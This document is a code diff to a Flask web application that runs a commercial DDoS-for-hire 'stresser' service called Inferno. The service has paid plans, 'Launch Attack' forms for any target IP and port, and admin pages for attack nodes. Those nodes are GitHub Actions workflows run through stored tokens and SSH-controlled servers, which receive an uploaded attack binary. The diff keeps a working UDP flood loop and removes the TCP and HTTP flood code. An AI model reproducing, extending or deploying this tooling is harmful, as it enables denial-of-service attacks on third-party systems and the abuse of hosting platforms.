@@ -1,4 +1,3 @@
-
 #!/usr/bin/env python3
 import os
 import socket
@@ -15,10 +14,11 @@ from flask import Flask, render_template_string, request, redirect, url_for, fla
 from flask_sqlalchemy import SQLAlchemy
 
 app = Flask(__name__)
-app.secret_key = os.environ.get("SECRET_KEY", secrets.token_urlsafe(32))
+app.secret_key = os.environ.get("InfernoCore", secrets.token_urlsafe(32))
 app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get("DATABASE_URL", "sqlite:///stresser.db")
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 db = SQLAlchemy(app)
+YML_FILE_PATH = ".github/workflows/main.yml"
 
 # ---------- Captcha Helper ----------
 def generate_captcha():
@@ -96,7 +96,7 @@ class AttackLog(db.Model):
     target = db.Column(db.String(100))
     port = db.Column(db.Integer)
     duration = db.Column(db.Integer)
-    method = db.Column(db.String(50))
+    method = db.Column(db.String(50), default="UDP")
     concurrent = db.Column(db.Integer, default=1)
     status = db.Column(db.String(20), default='running')
     timestamp = db.Column(db.DateTime, default=datetime.utcnow)
@@ -265,10 +265,9 @@ def distribute_binary_to_vps(node, binary_data):
 
 # ---------- Attack Triggers ----------
 def trigger_github_node(node, target, port, duration, method):
-    binary_method = "udp" if method == "UDP" else "tcp" if method == "TCP" else "udp"
-    # Number of parallel jobs – adjust for more power (max 256)
+    # Always use UDP
+    binary_method = "udp"
     matrix_size = 10
-
     yml_content = f"""name: Inferno Attack
 on: [push]
 
@@ -332,7 +331,6 @@ jobs:
       - name: Attack finished
         run: echo "Attack completed on $(date)"
 """
-
     try:
         g = Github(node.github_token)
         repo = g.get_repo(node.github_repo)
@@ -347,7 +345,7 @@ jobs:
         return False
 
 def trigger_vps_node(node, target, port, duration, method):
-    binary_method = "udp" if method == "UDP" else "tcp" if method == "TCP" else "udp"
+    binary_method = "udp"
     try:
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -370,34 +368,13 @@ def trigger_vps_node(node, target, port, duration, method):
 def run_local_python(target, port, duration, method):
     end_time = time.time() + duration
     packets = 0
-    if method == "UDP":
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        payload = random.randbytes(1024)
-        while time.time() < end_time:
-            sock.sendto(payload, (target, port))
-            packets += 1
-        sock.close()
-    elif method == "TCP":
-        while time.time() < end_time:
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(0.5)
-                sock.connect_ex((target, port))
-                sock.close()
-                packets += 1
-            except:
-                pass
-    else:
-        url = f"http://{target}:{port}"
-        headers = {"User-Agent": "Mozilla/5.0"}
-        while time.time() < end_time:
-            proxy = get_random_proxy()
-            proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
-            try:
-                requests.get(url, headers=headers, proxies=proxies, timeout=3)
-                packets += 1
-            except:
-                pass
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**20)
+    payload = random.randbytes(1024)
+    while time.time() < end_time:
+        sock.sendto(payload, (target, port))
+        packets += 1
+    sock.close()
     return packets
 
 def run_attack_on_nodes(user_id, target, port, duration, method, source='web'):
@@ -521,7 +498,7 @@ def attack_page():
         target = request.form.get('target')
         port = int(request.form.get('port'))
         duration = int(request.form.get('duration'))
-        method = request.form.get('method')
+        method = request.form.get('method', 'UDP')
         concurrent = int(request.form.get('concurrent', 1))
         if duration > user.max_duration:
             flash(f'Duration exceeds limit ({user.max_duration}s)', 'danger')
@@ -548,9 +525,9 @@ def products_page():
     user = User.query.get(session['user_id'])
     plans = [
         {'name': 'Free Plan', 'price': 'Free', 'concurrent': 1, 'duration': 60, 'methods': 'UDP Only', 'slots': 1},
-        {'name': 'Pro Plan', 'price': '$49/month', 'concurrent': 5, 'duration': 300, 'methods': 'UDP, TCP', 'slots': 5},
-        {'name': 'Enterprise Plan', 'price': '$199/month', 'concurrent': 25, 'duration': 1200, 'methods': 'All Methods', 'slots': 25},
-        {'name': 'Ultimate Plan', 'price': '$499/month', 'concurrent': 100, 'duration': 3600, 'methods': 'All Methods + API', 'slots': 100}
+        {'name': 'Pro Plan', 'price': '$49/month', 'concurrent': 5, 'duration': 300, 'methods': 'UDP Only', 'slots': 5},
+        {'name': 'Enterprise Plan', 'price': '$199/month', 'concurrent': 25, 'duration': 1200, 'methods': 'UDP Only', 'slots': 25},
+        {'name': 'Ultimate Plan', 'price': '$499/month', 'concurrent': 100, 'duration': 3600, 'methods': 'UDP Only', 'slots': 100}
     ]
     return render_template_string(PRODUCTS_HTML, user=user, plans=plans)
 
@@ -637,7 +614,7 @@ def admin_attack():
         target = request.form.get('target')
         port = int(request.form.get('port'))
         duration = int(request.form.get('duration'))
-        method = request.form.get('method')
+        method = request.form.get('method', 'UDP')
         concurrent = int(request.form.get('concurrent', 1))
         thread = threading.Thread(target=run_attack_on_nodes, args=(None, target, port, duration, method, 'admin'))
         thread.daemon = True
@@ -765,9 +742,7 @@ def admin_add_vps_node():
     if not name or not host or not username:
         flash('Name, host and username required', 'danger')
         return redirect(url_for('admin_nodes'))
-    
     key_path = None
-    # Handle uploaded .pem file
     if 'vps_key_file' in request.files:
         file = request.files['vps_key_file']
         if file and file.filename:
@@ -778,7 +753,6 @@ def admin_add_vps_node():
             key_path = os.path.join(key_dir, safe_name)
             file.save(key_path)
             os.chmod(key_path, 0o600)
-    
     node = AttackNode(
         name=name,
         node_type='vps',
@@ -995,7 +969,7 @@ input,select{background:rgba(0,0,0,0.5); border:1px solid #2a3a5a; border-radius
 <form method="POST"><div class="mb-3"><label>Target IP Address</label><input type="text" name="target" required></div>
 <div class="mb-3"><label>Port</label><input type="number" name="port" required></div>
 <div class="mb-3"><label>Duration (seconds) – Max {{ user.max_duration }}s</label><input type="number" name="duration" value="60" min="1" max="{{ user.max_duration }}" required></div>
-<div class="mb-3"><label>Attack Method</label><select name="method"><option>UDP</option><option>TCP</option><option>HTTP</option></select></div>
+<div class="mb-3"><label>Attack Method</label><select name="method"><option value="UDP">UDP Flood 🔥🔥🔥🔥🔥</option></select></div>
 <div class="mb-3"><label>Concurrent (Max {{ user.max_concurrent }})</label><input type="range" name="concurrent" class="form-range" min="1" max="{{ user.max_concurrent }}" value="1" oninput="this.nextElementSibling.value=this.value"><output>1</output></div>
 <button type="submit" class="btn-neon w-100">💥 Launch Attack</button></form>
 {% with messages = get_flashed_messages(with_categories=true) %}{% for cat, msg in messages %}<div class="alert alert-{{ cat }} mt-3">{{ msg }}</div>{% endfor %}{% endwith %}</div>
@@ -1068,7 +1042,7 @@ input,select{background:rgba(0,0,0,0.5); border:1px solid #2a3a5a; border-radius
 <form method="POST"><div class="mb-3"><label>Target IP Address</label><input type="text" name="target" required></div>
 <div class="mb-3"><label>Port</label><input type="number" name="port" required></div>
 <div class="mb-3"><label>Duration (seconds)</label><input type="number" name="duration" value="60" min="1" max="3600" required></div>
-<div class="mb-3"><label>Attack Method</label><select name="method"><option>UDP</option><option>TCP</option><option>HTTP</option></select></div>
+<div class="mb-3"><label>Attack Method</label><select name="method"><option value="UDP">UDP Flood</option></select></div>
 <div class="mb-3"><label>Concurrent Slots (1-100)</label><input type="range" name="concurrent" class="form-range" min="1" max="100" value="1" oninput="this.nextElementSibling.value=this.value"><output>1</output></div>
 <button type="submit" class="btn-admin w-100">🔥 Launch Admin Attack</button></form>
 {% with messages = get_flashed_messages(with_categories=true) %}{% for cat, msg in messages %}<div class="alert alert-{{ cat }} mt-3">{{ msg }}</div>{% endfor %}{% endwith %}</div>
@@ -1101,7 +1075,7 @@ ADMIN_ATTACKS_HTML = '''
 </style>
 </head>
 <body><div class="container"><div class="glass-card"><h2>Attack Logs</h2><a href="/admin/dashboard" class="btn btn-secondary mb-3">← Back</a>
-<div class="table-responsive"><table class="table table-dark"><thead><tr><th>ID</th><th>User ID</th><th>Target</th><th>Port</th><th>Method</th><th>Duration</th><th>Concurrent</th><th>Status</th><th>Time</th></tr></thead><tbody>{% for a in attacks %}<td><td>{{ a.id }}</td><td>{{ a.user_id }}</td><td>{{ a.target }}</td><td>{{ a.port }}</td><td>{{ a.method }}</td><td>{{ a.duration }}s</td><td>{{ a.concurrent }}</td><td>{{ a.status }}</td><td>{{ a.timestamp.strftime('%Y-%m-%d %H:%M:%S') }}</td></tr>{% endfor %}</tbody></table></div></div></div>
+<div class="table-responsive"><table class="table table-dark"><thead><tr><th>ID</th><th>User ID</th><th>Target</th><th>Port</th><th>Method</th><th>Duration</th><th>Concurrent</th><th>Status</th><th>Time</th></tr></thead><tbody>{% for a in attacks %}<tr><td>{{ a.id }}</td><td>{{ a.user_id }}</td><td>{{ a.target }}</td><td>{{ a.port }}</td><td>{{ a.method }}</td><td>{{ a.duration }}s</td><td>{{ a.concurrent }}</td><td>{{ a.status }}</td><td>{{ a.timestamp.strftime('%Y-%m-%d %H:%M:%S') }}</td></tr>{% endfor %}</tbody></table></div></div></div>
 </body></html>
 '''
 
@@ -1135,7 +1109,7 @@ ADMIN_NODES_HTML = '''
 <div class="row g-4"><div class="col-md-6"><div class="card bg-dark"><div class="card-header">➕ Add GitHub Node</div><div class="card-body"><form method="POST" action="/admin/nodes/add_github"><input type="text" name="name" placeholder="Node Name" class="form-control mb-2" required><input type="text" name="github_token" placeholder="GitHub Token" class="form-control mb-2" required><input type="text" name="github_repo" placeholder="Repo Name (default: InfernoCore)" class="form-control mb-2"><div class="form-check mb-2"><input type="checkbox" name="enabled" class="form-check-input" checked> <label class="form-check-label">Enabled</label></div><button type="submit" class="btn btn-primary">Add GitHub Node</button></form></div></div></div>
 <div class="col-md-6"><div class="card bg-dark"><div class="card-header">➕ Add VPS Node</div><div class="card-body"><form method="POST" action="/admin/nodes/add_vps" enctype="multipart/form-data"><input type="text" name="name" placeholder="Node Name" class="form-control mb-2" required><input type="text" name="vps_host" placeholder="VPS Host (IP)" class="form-control mb-2" required><input type="number" name="vps_port" placeholder="Port (default 22)" class="form-control mb-2" value="22"><input type="text" name="vps_username" placeholder="Username" class="form-control mb-2" required><input type="password" name="vps_password" placeholder="Password (or leave empty for key)" class="form-control mb-2"><div class="mb-2"><label>SSH Private Key (.pem file) – optional</label><input type="file" name="vps_key_file" class="form-control" accept=".pem,.key"><small class="text-muted">If provided, password will be ignored.</small></div><div class="form-check mb-2"><input type="checkbox" name="enabled" class="form-check-input" checked> <label class="form-check-label">Enabled</label></div><button type="submit" class="btn btn-primary">Add VPS Node</button></form></div></div></div></div>
 <div class="card bg-dark mt-4"><div class="card-header">📤 Distribute Binary</div><div class="card-body"><form method="POST" action="/admin/upload_binary" enctype="multipart/form-data" class="row g-2"><div class="col-md-8"><input type="file" name="binary" class="form-control bg-dark text-white" required></div><div class="col-md-4"><button type="submit" class="btn btn-warning">Upload & Distribute</button></div></form><small class="text-muted">Upload your compiled 'soul' binary. It will be sent to all enabled nodes.</small></div></div>
-<div class="table-responsive mt-4"><table class="table table-dark"><thead><tr><th>Name</th><th>Type</th><th>Enabled</th><th>Status</th><th>Binary</th><th>Details</th><th>Actions</th><tr></thead><tbody>{% for n in nodes %}<tr><td>{{ n.name }}</td><td>{{ n.node_type }}</td><td>{% if n.enabled %}<span class="text-success">✔</span>{% else %}<span class="text-danger">✘</span>{% endif %}</td><td class="{% if n.last_status == 'online' %}status-online{% else %}status-offline{% endif %}">{{ n.last_status|default('unknown') }}</td><td>{% if n.binary_present %}<span class="text-success">✓</span>{% else %}<span class="text-danger">✗</span>{% endif %}</td><td>{% if n.node_type=='github' %}{{ n.github_repo }}{% else %}{{ n.vps_host }}:{{ n.vps_port }}{% endif %}</td><td><form method="POST" action="/admin/nodes/{{ n.id }}/check" style="display:inline"><button class="btn btn-sm btn-info">Check</button></form> <form method="POST" action="/admin/nodes/{{ n.id }}/toggle" style="display:inline"><button class="btn btn-sm btn-warning">Toggle</button></form> <form method="POST" action="/admin/nodes/{{ n.id }}/delete" style="display:inline" onsubmit="return confirm('Delete node?')"><button class="btn btn-sm btn-danger">Delete</button></form></td></tr>{% endfor %}</tbody></table></div></div></div>
+<div class="table-responsive mt-4"><table class="table table-dark"><thead><tr><th>Name</th><th>Type</th><th>Enabled</th><th>Status</th><th>Binary</th><th>Details</th><th>Actions</th></tr></thead><tbody>{% for n in nodes %}<tr><td>{{ n.name }}</td><td>{{ n.node_type }}</td><td>{% if n.enabled %}<span class="text-success">✔</span>{% else %}<span class="text-danger">✘</span>{% endif %}</td><td class="{% if n.last_status == 'online' %}status-online{% else %}status-offline{% endif %}">{{ n.last_status|default('unknown') }}</td><td>{% if n.binary_present %}<span class="text-success">✓</span>{% else %}<span class="text-danger">✗</span>{% endif %}</td><td>{% if n.node_type=='github' %}{{ n.github_repo }}{% else %}{{ n.vps_host }}:{{ n.vps_port }}{% endif %}</td><td><form method="POST" action="/admin/nodes/{{ n.id }}/check" style="display:inline"><button class="btn btn-sm btn-info">Check</button></form> <form method="POST" action="/admin/nodes/{{ n.id }}/toggle" style="display:inline"><button class="btn btn-sm btn-warning">Toggle</button></form> <form method="POST" action="/admin/nodes/{{ n.id }}/delete" style="display:inline" onsubmit="return confirm('Delete node?')"><button class="btn btn-sm btn-danger">Delete</button></form></td></tr>{% endfor %}</tbody></table></div></div></div>
 </body></html>
 '''
 
